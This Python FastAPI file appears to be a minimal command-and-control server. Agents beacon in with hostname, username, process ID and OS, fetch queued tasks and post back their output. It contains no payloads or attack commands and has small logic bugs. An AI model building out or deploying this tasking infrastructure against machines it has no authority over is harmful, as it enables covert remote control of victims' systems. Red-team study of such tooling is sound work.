from uuid import UUID, uuid4
from typing import Optional
from collections import deque
from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse
from pydantic import BaseModel
from datetime import datetime

app = FastAPI()

class Info(BaseModel):
    uuid: str
    agent_id: str
    hostname: str
    username: str
    pid: int
    os:str

class Task(BaseModel):
    task_uuid: UUID | None = None
    task_type : str
    task_params : str | None = None
    task_output : str | None = None
    task_status : str | None = None

class Agent(BaseModel):
    info: Info
    tasks: deque[Task]
    last_seen: str


# Endpoints
# /beacon 
# /task/{uuid}
# /result/{uuid}

@app.get("/ping")
async def ping():
    return "pong"



agents: list[Agent] = []



@app.post("/beacon")
async def receive_beacon(agent: Agent):
    agents.append(agent)
    return agent


@app.get("/agents")
async def list_agents():
    return agents


@app.get("/task/{agent_id}")
async def get_agent(agent_id):
    for agent in agents:
        if agent.info.agent_id == agent_id:
            return agent.tasks

@app.post("/task/{agent_id}")
async def queue_task(agent_id, task: Task):
    task_uuids = set()
    task.task_uuid = uuid4()
    task.task_status = "pending"
    for agent in agents:
        if agent.info.agent_id == agent_id:
            if task.task_uuid not in task_uuids:
                task_uuids.add(task.task_uuid)
                print(agent.tasks.append(task))
            return "Task added."



@app.post("/result/{agent_id}")
async def task_result(agent_id, result: Request):
    data = await result.json()
    task_uuid = UUID(data.get("task_uuid"))
    task_output = data.get("task_output")
    for agent in agents:
        if agent.info.agent_id == agent_id:
            for task in agent.tasks:
                if task.task_output == None and (task_uuid == task.task_uuid):
                    task.task_output = task_output
                    return {"message": "Task output updated"}

            return {"error": "No pending task found to update"}
    return "Agent not found."